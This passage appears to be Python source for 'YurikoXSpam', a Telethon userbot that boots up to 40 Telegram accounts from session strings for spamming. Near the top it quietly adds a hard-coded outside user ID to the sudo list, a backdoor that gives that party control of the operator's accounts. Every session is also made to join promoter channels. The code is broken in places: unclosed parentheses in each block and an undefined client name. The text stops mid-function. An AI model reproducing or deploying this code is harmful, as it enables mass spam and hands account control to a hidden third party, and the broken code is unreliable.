# YurikoXSpam - Spam Userbots
# Copyright © 2021 @XD_RAJVEER

import os
import sys
import random
import asyncio
import telethon.utils
from telethon.tl import functions
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from decouple import config
from os import getenv
import logging
import time
from telethon.tl.functions.messages import ImportChatInviteRequest


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

#version

yurikoversion = "v2.0.1"

#values
API_ID = config("API_ID", default=None, cast=int)
API_HASH = config("API_HASH", default=None)
ALIVE_PIC = config("ALIVE_PIC", default=None)
CMD_HNDLR = getenv("CMD_HNDLR", default=".")
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
STRING = config("STRING", default=None)
STRING2 = config("STRING2", default=None)
STRING3 = config("STRING3", default=None)
STRING4 = config("STRING4", default=None)
STRING5 = config("STRING5", default=None)
STRING6 = config("STRING6", default=None)
STRING7 = config("STRING7", default=None)
STRING8 = config("STRING8", default=None)
STRING9 = config("STRING9", default=None)
STRING10 = config("STRING10", default=None)
STRING11 = config("STRING11", default=None)
STRING12 = config("STRING12", default=None)
STRING13 = config("STRING13", default=None)
STRING14 = config("STRING14", default=None)
STRING15 = config("STRING15", default=None)
STRING16 = config("STRING16", default=None)
STRING17 = config("STRING17", default=None)
STRING18 = config("STRING18", default=None)
STRING19 = config("STRING19", default=None)
STRING20 = config("STRING20", default=None)
STRING21 = config("STRING21", default=None)
STRING22 = config("STRING22", default=None)
STRING23 = config("STRING23", default=None)
STRING24 = config("STRING24", default=None)
STRING25 = config("STRING25", default=None)
STRING26 = config("STRING26", default=None)
STRING27 = config("STRING27", default=None)
STRING28 = config("STRING28", default=None)
STRING29 = config("STRING29", default=None)
STRING30 = config("STRING30", default=None)
STRING31 = config("STRING31", default=None)
STRING32 = config("STRING32", default=None)
STRING33 = config("STRING33", default=None)
STRING34 = config("STRING34", default=None)
STRING35 = config("STRING35", default=None)
STRING36 = config("STRING36", default=None)
STRING37 = config("STRING37", default=None)
STRING38 = config("STRING38", default=None)
STRING39 = config("STRING39", default=None)
STRING40 = config("STRING40", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
if 5090863972 not in SUDO_USERS:
    SUDO_USERS.append(5090863972)
OWNER_ID = int(os.environ.get("OWNER_ID", None))

# Don't Mess with Codes !! 
DEV = list(map(int, getenv("FULLSUDO").split()))
DB_URI = config("DATABASE_URL", None)
DEV.append(OWNER_ID)
SUDO_USERS.append(OWNER_ID)

# Sessions
async def YurikoX():
    global Yur
    global Yur2
    global Yur3
    global Yur4
    global Yur5
    global Yur6
    global Yur7
    global Yur8
    global Yur9
    global Yur10
    global Yur11
    global Yur12
    global Yur13
    global Yur14
    global Yur15
    global Yur16
    global Yur17
    global Yur18
    global Yur19
    global Yur20
    global Yur21
    global Yur22
    global Yur23
    global Yur24
    global Yur25
    global Yur26
    global Yur27
    global Yur28
    global Yur29
    global Yur30
    global Yur31
    global Yur32
    global Yur33
    global Yur34
    global Yur35
    global Yur36
    global Yur37
    global Yur38
    global Yur39
    global Yur40
    
    if STRING:
        session_name = str(STRING)
        print("String 1 Found")
        Yur = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 1")
            await Yur.start()
            botme = await Yur.get_me()
            await Yur(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur = "STRING"
            print(e)
            pass
    else:
        print("Session 1 not Found")
        session_name = "yurikoxspam"
        Yur = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur.start()
        except Exception as e:
            pass
   
    if STRING2:
        session_name = str(STRING2)
        print("String 2 Found")
        Yur2 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 2")
            await Yur2.start()
            botme = await Riz.get_me()
            await Yur2(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur2(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur2(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur2 = "STRING"
            print(e)
            pass
    else:
        print("Session 2 not Found")
        session_name = "yurikoxspam"
        Yur2 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur2.start()
        except Exception as e:
            pass

    if STRING3:
        session_name = str(STRING3)
        print("String 3 Found")
        Yur3 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 3")
            await Yur3.start()
            botme = await Yur3.get_me()
            await Yur3(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur3(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur3(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur3 = "STRING"
            print(e)
            pass
    else:
        print("Session 3 not Found")
        session_name = "yurikoxspam"
        Yur3 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur3.start()
        except Exception as e:
            pass

    if STRING4:
        session_name = str(STRING4)
        print("String 4 Found")
        Yur4 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 4")
            await Yur4.start()
            botme = await Yur4.get_me()
            await Yur4(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur4(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur4(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur4 = "STRING"
            print(e)
            pass
    else:
        print("Session 4 not Found")
        session_name = "yurikoxspam"
        Yur4 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur4.start()
        except Exception as e:
            pass

    if STRING5:
        session_name = str(STRING5)
        print("String 5 Found")
        Yur5 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 5")
            await Yur5.start()
            botme = await Yur5.get_me()
            await Yur5(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur5(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur5(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur5 = "STRING"
            print(e)
            pass
    else:
        print("Session 5 not Found")
        session_name = "yurikoxspam"
        Yur5 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur5.start()
        except Exception as e:
            pass
                  
    if STRING6:
        session_name = str(STRING6)
        print("String 6 Found")
        Yur6 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 6")
            await Yur6.start()
            botme = await Yur6.get_me()
            await Yur6(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur6(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur6(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur6 = "STRING"
            print(e)
            pass
    else:
        print("Session 6 not Found")
        session_name = "yurikoxspam"
        Yur6 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur6.start()
        except Exception as e:
            pass

    if STRING7:
        session_name = str(STRING7)
        print("String 7 Found")
        Yur7 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 7")
            await Yur7.start()
            botme = await Yur7.get_me()
            await Yur7(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur7(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur7(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur7 = "STRING"
            print(e)
            pass
    else:
        print("Session 7 not Found")
        session_name = "yurikoxspam"
        Yur7 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur7.start()
        except Exception as e:
            pass   
        
    
    if STRING8:
        session_name = str(STRING8)
        print("String 8 Found")
        Yur8 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 7")
            await Yur8.start()
            botme = await Yur8.get_me()
            await Yur8(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur8(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur8(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur8 = "STRING"
            print(e)
            pass
    else:
        print("Session 7 not Found")
        session_name = "yurikoxspam"
        Yur8 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur8.start()
        except Exception as e:
            pass  
        
    if STRING9:
        session_name = str(STRING9)
        print("String 9 Found")
        Yur9 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 9")
            await Yur9.start()
            botme = await Yur9.get_me()
            await Yur9(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur9(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur9(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur9 = "STRING"
            print(e)
            pass
    else:
        print("Session 9 not Found")
        session_name = "yurikoxspam"
        Yur9 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur9.start()
        except Exception as e:
            pass  
    
  
    if STRING10:
        session_name = str(STRING10)
        print("String 10 Found")
        Yur10 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 10")
            await Yur10.start()
            botme = await Yur10.get_me()
            await Yur10(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur10(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur10(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur10 = "STRING"
            print(e)
            pass
    else:
        print("Session 10 not Found")
        session_name = "yurikoxspam"
        Yur10 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur10.start()
        except Exception as e:
            pass
        
    
    if STRING11:
        session_name = str(STRING11)
        print("String 11 Found")
        Yur11 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 11")
            await Yur11.start()
            botme = await Yur11.get_me()
            await Yur11(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur11(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur11(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur11 = "STRING"
            print(e)
            pass
    else:
        print("Session 11 not Found")
        session_name = "yurikoxspam"
        Yur11 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur11.start()
        except Exception as e:
            pass
        
    
    if STRING12:
        session_name = str(STRING12)
        print("String 12 Found")
        Yur12 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 12")
            await Yur12.start()
            botme = await Yur12.get_me()
            await Yur12(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur12(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur12(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur12 = "STRING"
            print(e)
            pass
    else:
        print("Session 12 not Found")
        session_name = "yurikoxspam"
        Yur12 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur12.start()
        except Exception as e:
            pass
    
  
    if STRING13:
        session_name = str(STRING13)
        print("String 13  Found")
        Yur13 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 13")
            await Yur13.start()
            botme = await Yur13.get_me()
            await Yur13(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur13(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur13(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur13 = "STRING"
            print(e)
            pass
    else:
        print("Session 13 not Found")
        session_name = "yurikoxspam"
        Yur13 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur13.start()
        except Exception as e:
            pass
        
    
    if STRING14:
        session_name = str(STRING14)
        print("String 14 Found")
        Yur14 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 14")
            await Yur14.start()
            botme = await Yur14.get_me()
            await Yur14(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur14(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur14(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur14 = "STRING"
            print(e)
            pass
    else:
        print("Session 14 not Found")
        session_name = "yurikoxspam"
        Yur14 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur14.start()
        except Exception as e:
            pass
        
    
    if STRING15:
        session_name = str(STRING15)
        print("String 15 Found")
        Yur15 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 15")
            await Yur15.start()
            botme = await Yur15.get_me()
            await Yur15(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur15(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur15(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur15 = "STRING"
            print(e)
            pass
    else:
        print("Session 15 not Found")
        session_name = "yurikoxspam"
        Yur15 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur15.start()
        except Exception as e:
            pass


    if STRING16:
        session_name = str(STRING16)
        print("String 16 Found")
        Yur16 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 16")
            await Yur16.start()
            botme = await Yur16.get_me()
            await Yur16(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur16(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur16(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur16 = "STRING"
            print(e)
            pass
    else:
        print("Session 16 not Found")
        session_name = "yurikoxspam"
        Yur16 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur16.start()
        except Exception as e:
            pass
   
    if STRING17:
        session_name = str(STRING17)
        print("String 17 Found")
        Yur17 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 17")
            await Yur17.start()
            botme = await Yur17.get_me()
            await Yur17(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur17(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur17(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur17 = "STRING"
            print(e)
            pass
    else:
        print("Session 17 not Found")
        session_name = "yurikoxspam"
        Yur17 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur17.start()
        except Exception as e:
            pass
   
    if STRING18:
        session_name = str(STRING18)
        print("String 18 Found")
        Yur18 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 18")
            await Yur18.start()
            botme = await Yur18.get_me()
            await Yur18(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur18(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur18(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur18 = "STRING"
            print(e)
            pass
    else:
        print("Session 18 not Found")
        session_name = "yurikoxspam"
        Yur18 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur18.start()
        except Exception as e:
            pass
   
    if STRING19:
        session_name = str(STRING19)
        print("String 19 Found")
        Yur19 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 19")
            await Yur19.start()
            botme = await Yur19.get_me()
            await Yur19(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur19(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur19(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur19 = "STRING"
            print(e)
            pass
    else:
        print("Session 19 not Found")
        session_name = "yurikoxspam"
        Yur19 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur19.start()
        except Exception as e:
            pass
   
    if STRING20:
        session_name = str(STRING20)
        print("String 20 Found")
        Yur20 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 20")
            await Yur20.start()
            botme = await Yur20.get_me()
            await Yur20(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur20(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur20(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur20 = "STRING"
            print(e)
            pass
    else:
        print("Session 20 not Found")
        session_name = "yurikoxspam"
        Yur20 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur20.start()
        except Exception as e:
            pass

    if STRING21:
        session_name = str(STRING21)
        print("String 21 Found")
        Yur21 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 21")
            await Yur21.start()
            botme = await Yur21.get_me()
            await Yur21(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur21(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur21(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur21 = "STRING"
            print(e)
            pass
    else:
        print("Session 21 not Found")
        session_name = "yurikoxspam"
        Yur21 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur21.start()
        except Exception as e:
            pass
   
    if STRING22:
        session_name = str(STRING22)
        print("String 22 Found")
        Yur22 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 22")
            await Yur22.start()
            botme = await Yur22.get_me()
            await Yur22(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur22(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur22(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur22 = "STRING"
            print(e)
            pass
    else:
        print("Session 22 not Found")
        session_name = "yurikoxspam"
        Yur22 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur22.start()
        except Exception as e:
            pass

    if STRING23:
        session_name = str(STRING23)
        print("String 23 Found")
        Yur23 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 23")
            await Yur23.start()
            botme = await Yur23.get_me()
            await Yur23(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur23(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur23(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur23 = "STRING"
            print(e)
            pass
    else:
        print("Session 23 not Found")
        session_name = "yurikoxspam"
        Yur23 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur23.start()
        except Exception as e:
            pass

    if STRING24:
        session_name = str(STRING24)
        print("String 24 Found")
        Yur24 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 24")
            await Yur24.start()
            botme = await Yur24.get_me()
            await Yur24(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur24(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur24(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur24 = "STRING"
            print(e)
            pass
    else:
        print("Session 24 not Found")
        session_name = "yurikoxspam"
        Yur24 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur24.start()
        except Exception as e:
            pass

    if STRING25:
        session_name = str(STRING25)
        print("String 25 Found")
        Yur25 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 25")
            await Yur25.start()
            botme = await Yur25.get_me()
            await Yur25(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur25(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur25(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur25 = "STRING"
            print(e)
            pass
    else:
        print("Session 25 not Found")
        session_name = "yurikoxspam"
        Yur25 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur25.start()
        except Exception as e:
            pass
                  
    if STRING26:
        session_name = str(STRING26)
        print("String 26 Found")
        Yur26 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 26")
            await Yur26.start()
            botme = await Yur26.get_me()
            await Yur26(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur26(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur26(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur26 = "STRING"
            print(e)
            pass
    else:
        print("Session 26 not Found")
        session_name = "yurikoxspam"
        Yur26 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur26.start()
        except Exception as e:
            pass

    if STRING27:
        session_name = str(STRING27)
        print("String 27 Found")
        Yur27 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 27")
            await Yur27.start()
            botme = await Yur27.get_me()
            await Yur27(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur27(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur27(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur27 = "STRING"
            print(e)
            pass
    else:
        print("Session 27 not Found")
        session_name = "yurikoxspam"
        Yur27 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur27.start()
        except Exception as e:
            pass    
        
    
    if STRING28:
        session_name = str(STRING28)
        print("String 28 Found")
        Yur28 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 28")
            await Yur28.start()
            botme = await Yur28.get_me()
            await Yur28(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur28(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur28(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur28 = "STRING"
            print(e)
            pass
    else:
        print("Session 28 not Found")
        session_name = "yurikoxspam"
        Yur28 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur28.start()
        except Exception as e:
            pass  
        
    if STRING29:
        session_name = str(STRING29)
        print("String 29 Found")
        Yur29 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 29")
            await Yur29.start()
            botme = await Yur29.get_me()
            await Yur29(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur29(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur29(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur29 = "STRING"
            print(e)
            pass
    else:
        print("Session 29 not Found")
        session_name = "yurikoxspam"
        Yur29 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur29.start()
        except Exception as e:
            pass  
    
  
    if STRING30:
        session_name = str(STRING30)
        print("String 30 Found")
        Yur30 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 30")
            await Yur30.start()
            botme = await Yur30.get_me()
            await Yur30(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur30(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur30(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur30 = "STRING"
            print(e)
            pass
    else:
        print("Session 30 not Found")
        session_name = "yurikoxspam"
        Yur30 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur30.start()
        except Exception as e:
            pass
        
    
    if STRING31:
        session_name = str(STRING31)
        print("String 31 Found")
        Yur31 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 31")
            await Yur31.start()
            botme = await Yur31.get_me()
            await Yur31(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur31(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur31(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur31 = "STRING"
            print(e)
            pass
    else:
        print("Session 31 not Found")
        session_name = "yurikoxspam"
        Yur31 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur31.start()
        except Exception as e:
            pass
        
    
    if STRING32:
        session_name = str(STRING32)
        print("String 32 Found")
        Yur32 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 31")
            await Yur32.start()
            botme = await Yur32.get_me()
            await Yur32(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur32(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur32(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur32 = "STRING"
            print(e)
            pass
    else:
        print("Session 32 not Found")
        session_name = "yurikoxspam"
        Yur32 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur32.start()
        except Exception as e:
            pass  
    
  
    if STRING33:
        session_name = str(STRING33)
        print("String 33  Found")
        Yur33 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 33")
            await Yur33.start()
            botme = await Yur33.get_me()
            await Yur33(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur33(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur33(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur33 = "STRING"
            print(e)
            pass
    else:
        print("Session 33 not Found")
        session_name = "yurikoxspam"
        Yur33 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur33.start()
        except Exception as e:
            pass
        
    
    if STRING34:
        session_name = str(STRING34)
        print("String 34 Found")
        Yur34 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 34")
            await Yur34.start()
            botme = await Yur34.get_me()
            await Yur34(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur34(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
            await Yur34(functions.channels.JoinChannelRequest(channel="@ZOD_HACKS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Yur34 = "STRING"
            print(e)
            pass
    else:
        print("Session 34 not Found")
        session_name = "yurikoxspam"
        Yur34 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Yur34.start()
        except Exception as e:
            pass
        
    
    if STRING35:
        session_name = str(STRING35)
        print("String 35 Found")
        Yur35 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 35")
            await Yur35.start()
            botme = await Yur35.get_me()
            await Yur35(functions.channels.JoinChannelRequest(channel="@YurikoXSpam")
            await Yur35(functions.channels.JoinChannelRequest(channel="@YurikoXSpamgod"))
